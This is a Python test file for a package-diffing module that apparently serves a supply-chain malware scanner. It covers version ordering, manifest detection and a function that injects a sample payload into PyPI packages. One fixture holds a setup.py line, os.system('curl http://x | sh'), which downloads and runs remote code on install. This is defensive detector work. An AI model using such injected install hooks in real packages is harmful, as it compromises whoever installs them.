import random

from customs_ml import diff


def test_new_lines_is_a_multiset_difference():
    # Same cases as the Rust unit test in crates/customs-scan/src/delta.rs.
    assert diff.new_lines(b"a\nb\na\n", b"a\nb\nc\na\na\n") == b"c\na"
    assert diff.new_lines(b"x", b"x") == b""
    assert diff.new_lines(b"x", b"x\n") == b""
    assert diff.new_lines(b"", b"y\n") == b"y"


def test_build_delta_keeps_added_changed_and_manifests():
    prev = {
        "package.json": b'{"version":"1.0.0"}',
        "index.js": b"module.exports = 1;\n",
        "lib/a.js": b"same\n",
        "old.js": b"gone\n",
    }
    cur = {
        "package.json": b'{"version":"1.0.1"}',
        "index.js": b"module.exports = 1;\nrequire('child_process');\n",
        "lib/a.js": b"same\n",
        "bundle.js": b"payload()\n",
    }
    delta, stats = diff.build_delta(prev, cur)
    assert sorted(delta) == ["bundle.js", "index.js", "package.json"]
    assert delta["index.js"] == b"require('child_process');"
    assert delta["package.json"] == cur["package.json"]
    assert stats == {
        "n_added": 1,
        "n_modified": 2,
        "n_unchanged": 1,
        "n_removed": 1,
        "added_bytes": 10 + 25 + 19,
        "cur_files": 4,
        "prev_files": 4,
    }


def test_wheel_metadata_is_a_manifest_and_whitespace_changes_drop():
    assert diff.is_manifest("demo-1.0.dist-info/METADATA")
    assert not diff.is_manifest("demo/sub.dist-info/METADATA")
    prev = {"a.py": b"x = 1\n", "b.bin": b"\x00\x01"}
    cur = {"a.py": b"x = 1\n\n  \n", "b.bin": b"\x00\x02"}
    delta, stats = diff.build_delta(prev, cur)
    assert list(delta) == ["b.bin"]
    assert stats["added_bytes"] == 3 + 2


def test_previous_version_ordering():
    assert diff.previous_version("npm", "1.2.0", ["1.1.9", "1.10.0", "1.2.0-rc.1"]) == "1.1.9"
    assert diff.previous_version("npm", "2.0.0-rc.2", ["2.0.0-rc.1", "1.9.0"]) == "2.0.0-rc.1"
    assert diff.previous_version("pypi", "1.0.post1", ["1.0", "0.9", "1.0rc1"]) == "1.0"
    assert diff.previous_version("pypi", "0.1", ["0.2"]) is None
    assert diff.previous_version("npm", "not-a-version", ["1.0.0"]) is None


def test_injected_payload_reaches_the_install_or_import_path():
    donor = {"setup.py": b"import os\nos.system('curl http://x | sh')\n" * 4}
    cur = {"setup.py": b"from setuptools import setup\n", "pkg/__init__.py": b"VERSION = 1\n"}
    for seed in range(20):
        out, mode = diff.inject("pypi", cur, donor, random.Random(seed))
        delta, _ = diff.build_delta(cur, out)
        text = b"\n".join(delta.values())
        assert b"os.system" in text, mode
        if mode == "new_module":
            assert b"from . import" in out["pkg/__init__.py"]
